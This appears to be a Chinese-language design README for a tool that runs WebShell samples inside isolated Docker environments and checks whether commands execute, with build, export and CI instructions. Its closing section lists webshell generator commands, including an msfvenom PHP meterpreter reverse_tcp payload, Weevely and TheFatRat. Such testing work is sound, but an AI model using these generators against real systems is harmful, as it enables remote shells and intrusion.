## 模块设计

* 1. Test Case Manager

维护 WebShell 样本库（类型、代码、密码、连接方式等）

维护测试输入/命令（如 whoami, ipconfig, ls）

* 2. Environment Engine
使用 Docker 动态构建目标环境：例如

Apache + PHP 7.4

IIS + ASP Classic

Tomcat + JSP 1.2

配置端口映射、环境变量、虚拟机隔离等

提供启动/关闭容器、还原状态等功能

✅ 推荐：基于 docker-compose 和 Python 的 docker SDK 自动管理环境

* 3. WebShell Executor
尝试自动访问 WebShell 入口：

URL 构造 + POST/GET 请求

支持常见密码参数（如 ?pwd=xxx&cmd=...）

执行命令、收集输出

✅ 推荐：使用 requests + multiprocessing / asyncio 实现并发执行

* 4. Result Analyzer
判断是否执行成功

返回码/关键字匹配（比如是否包含执行命令结果）

执行耗时、异常、输出异常判断

可集成安全日志分析（是否触发WAF等）

* 5. 安全隔离建议
所有容器运行在 Docker 网络中，禁止访问主机或公网

WebShell 限制只能运行特定命令或脚本沙箱（如 chroot, seccomp）

## 目录结构
```
webshell_tester/
├── docker_templates/         # 存放不同环境的 Dockerfile 和配置
│   ├── php7.4_apache/
│   └── php8.1_nginx/
├── shells/                   # 存放待测试的 WebShell 脚本
│   └── test1.php
├── core/
│   ├── environment.py        # 控制容器启动/销毁
│   ├── uploader.py           # 上传 WebShell
│   ├── executor.py           # 执行并收集结果
│   └── config.py             # 参数配置
├── run.py                    # 主入口
└── requirements.txt
```

## 功能
添加并行构建支持
添加更详细的构建选项
添加构建缓存控制

添加超时设置
添加构建标签
* 添加代理设置
  ```bash
  在命令行中使用代理build tomcat9镜像
  python tools/prebuild_images.py build --env tomcat9 --http-proxy http://192.168.2.2:7890 --https-proxy http://192.168.2.2:7890 --no-proxy localhost,127.0.0.1
  ```
添加构建上下文选项

* 添加镜像清理功能
* 添加镜像导出功能
  * todo
  ```
  添加导出进度条
  添加导出文件校验
  添加并行导出支持
  添加导出历史记录
  ```
  * 导出命令：
  ```bash
  python tools/prebuild_images.py export [选项]
  ```
  * 导出选项
  ```bash
  --env: 指定要导出的环境（可选）
  --output/-o: 指定输出路径或目录
  --no-compress: 不压缩导出文件
  ```
  * 功能特点
  ```bash
  支持导出单个或所有环境
  默认使用 gzip 压缩
  自动创建导出目录
  使用时间戳命名文件
  显示导出文件大小
  详细的进度日志

  ```
  * 使用示例
  ```bash
  1 导出单个环境：
  # 导出到指定文件
  python tools/prebuild_images.py export --env php7.4_apache -o /path/to/php.tar.gz

  # 导出到默认目录（不压缩）
  python tools/prebuild_images.py export --env php7.4_apache --no-compress

  2 导出所有环境：
  # 导出到指定目录
  python tools/prebuild_images.py export -o /path/to/exports/

  # 导出到默认目录
  python tools/prebuild_images.py export
  ```
添加镜像标签管理
添加镜像历史清理
添加构建缓存清理


## 改进建议

### 1. 测试报告模块
* 详细的测试报告生成功能
  - 支持多种导出格式（HTML、PDF）
  - 测试结果可视化展示
  - 执行时间统计分析
  - 成功/失败率统计
  - 异常分类汇总

### 2. 监控告警系统
* 资源监控
  - 容器CPU使用率监控
  - 内存占用监控
  - 磁盘I/O监控
* 异常告警
  - 邮件/消息通知
  - 自定义告警阈值
  - 告警级别分类
* 实时状态展示
  - Web界面展示测试进度
  - 实时日志查看
  - 测试队列状态

### 3. 配置管理优化
* YAML格式测试用例管理
  ```yaml
  testcase:
    name: "PHP WebShell Test"
    shell:
      type: "php"
      version: "7.4"
      file: "test1.php"
    environment:
      server: "apache"
      version: "2.4"
    commands:
      - "whoami"
      - "pwd"
      - "ls -la"
  ```
* 动态参数配置
  - 环境变量配置
  - 测试超时设置
  - 并发度配置
* 环境模板管理
  - 预设环境快速部署
  - 自定义环境配置
  - 环境依赖检查

### 4. CI/CD集成
* RESTful API接口
  ```
  POST /api/v1/test/run
  GET /api/v1/test/status/{id}
  GET /api/v1/test/report/{id}
  ```
* 自动化测试流程
  - Jenkins集成
  - GitHub Actions支持
  - GitLab CI支持
* 结果回调机制
  - Webhook支持
  - 自定义回调接口
  - 状态同步机制

## 开发路线图

### Phase 1: 核心功能实现
- [x] 基础框架搭建
- [x] Docker环境管理
- [x] WebShell执行器
- [ ] 结果分析器

### Phase 2: 功能增强
- [ ] 测试报告模块
- [ ] 监控告警系统
- [ ] Web管理界面
- [ ] API接口开发

### Phase 3: 集成与优化
- [ ] CI/CD集成
- [ ] 性能优化
- [ ] 安全加固
- [ ] 文档完善

### TODO

添加更多的测试环境（如ASP、JSP等）

实现测试报告生成

添加Web管理界面

开发监控告警功能

## 性能优化

### 1. 镜像构建优化
* 镜像缓存机制
  - 自动检测和复用已构建的镜像
  - 仅在必要时重新构建
  - 启用Docker层缓存加速构建

* Dockerfile优化
  ```dockerfile
  # 合并多个RUN命令减少层数
  RUN apt-get update && apt-get install -y \
      curl \
      && docker-php-ext-install pdo pdo_mysql \
      && a2enmod rewrite \
      # ... 更多命令
  
  # 分离频繁变化的层
  COPY shells/ /var/www/html/
  ```
  - 合并RUN命令减少层数
  - 优化命令顺序提高缓存利用率
  - 分离频繁变化的文件，避免影响其他层的缓存

### 2. 预构建工具
提供了镜像预构建工具，可以提前构建或批量更新环境镜像：

* 帮助选项：

```bash
─# python tools/prebuild_images.py --help   
usage: prebuild_images.py [-h] [--env ENV] [--list] [--no-cache] [--pull] [--network NETWORK]
                          [--build-args BUILD_ARGS] [--platform PLATFORM] [--squash]

WebShell测试环境Docker镜像构建工具

options:
  -h, --help            show this help message and exit
  --env ENV             要构建的环境名称，不指定则构建所有环境
  --list                列出所有可用的环境
  --no-cache            禁用Docker构建缓存
  --pull                强制拉取基础镜像
  --network NETWORK     构建时使用的网络
  --build-args BUILD_ARGS
                        自定义构建参数 (格式: KEY1=VALUE1,KEY2=VALUE2)
  --platform PLATFORM   目标平台 (例如: linux/amd64, linux/arm64)
  --squash              压缩镜像层
```


* 使用示例：

1、预构建所有环境镜像
```bash
python tools/prebuild_images.py
```

2、使用自定义参数构建：
```bash
python tools/prebuild_images.py --env spring_boot --build-args JAVA_VERSION=17,MAVEN_VERSION=3.8.5
```

3、指定目标平台
```bash
python tools/prebuild_images.py --env python_flask --platform linux/arm64
```

4、查看环境信息：
```bash
python tools/prebuild_images.py --list
2025-04-24 22:21:30 | INFO     | 可用的环境:
2025-04-24 22:21:30 | INFO     | - php7.4_apache:
2025-04-24 22:21:30 | INFO     |   镜像: webshell-tester/php7.4-apache:latest
2025-04-24 22:21:30 | INFO     | - tomcat9:
2025-04-24 22:21:30 | INFO     |   镜像: webshell-tester/tomcat9:latest
2025-04-24 22:21:30 | INFO     |   默认构建参数: {'TOMCAT_VERSION': '9.0.71', 'JAVA_VERSION': '11'}
2025-04-24 22:21:30 | INFO     | - python_flask:
2025-04-24 22:21:30 | INFO     |   镜像: webshell-tester/python-flask:latest
2025-04-24 22:21:30 | INFO     |   默认构建参数: {'PYTHON_VERSION': '3.9'}
2025-04-24 22:21:30 | INFO     | - nodejs_express:
2025-04-24 22:21:30 | INFO     |   镜像: webshell-tester/nodejs-express:latest
2025-04-24 22:21:30 | INFO     |   默认构建参数: {'NODE_VERSION': '16'}
2025-04-24 22:21:30 | INFO     | - spring_boot:
2025-04-24 22:21:30 | INFO     |   镜像: webshell-tester/spring-boot:latest
2025-04-24 22:21:30 | INFO     |   默认构建参数: {'JAVA_VERSION': '11', 'MAVEN_VERSION': '3.8.4'}
```

工具特性：
- 支持批量构建所有环境镜像
- 自动处理构建依赖
- 详细的构建日志
- 适合在CI/CD流程中使用

### 3. 使用建议
* 日常测试
  ```bash
  python main.py  # 自动使用缓存镜像
  ```

* 环境更新
  ```bash
  # 更新所有环境镜像
  python tools/prebuild_images.py
  
  # 或者在运行时强制重建
  python main.py --rebuild
  ```

* CI/CD集成
  ```yaml
  # 示例GitHub Actions配置
  jobs:
    prebuild:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@v2
        - name: Prebuild Images
          run: python tools/prebuild_images.py
  ```

### 4. 性能对比
| 场景 | 首次构建 | 缓存构建 | 直接使用 |
|------|----------|----------|----------|
| PHP环境 | ~3分钟 | ~30秒 | ~5秒 |
| ASP环境 | ~5分钟 | ~45秒 | ~5秒 |
| JSP环境 | ~4分钟 | ~40秒 | ~5秒 |

* 首次构建：完整构建环境镜像
* 缓存构建：使用层缓存重新构建
* 直接使用：复用已构建的镜像

### 5. 最佳实践
1. 在开发环境中使用缓存机制
2. 在CI/CD中定期预构建更新
3. 根据需要调整缓存策略
4. 合理组织Dockerfile层次结构
5. 及时清理不需要的镜像和缓存


## 测试多种webshell生成器
* 1 Weevely
```
# 安装
apt-get install weevely

# 生成webshell
weevely generate <password> <path>
# 例如：
weevely generate mypass123 /tmp/shell.php
```

* 2 TheFatRat
```
# 克隆仓库
git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
# 安装
chmod +x setup.sh
./setup.sh
# 运行后可以选择生成各种类型的webshell
```

* 3 Metasploit Framework
```
# 生成PHP webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

* 4 Laudanum
```
# Kali Linux自带
ls /usr/share/webshells/laudanum/
# 包含多种类型的webshell
```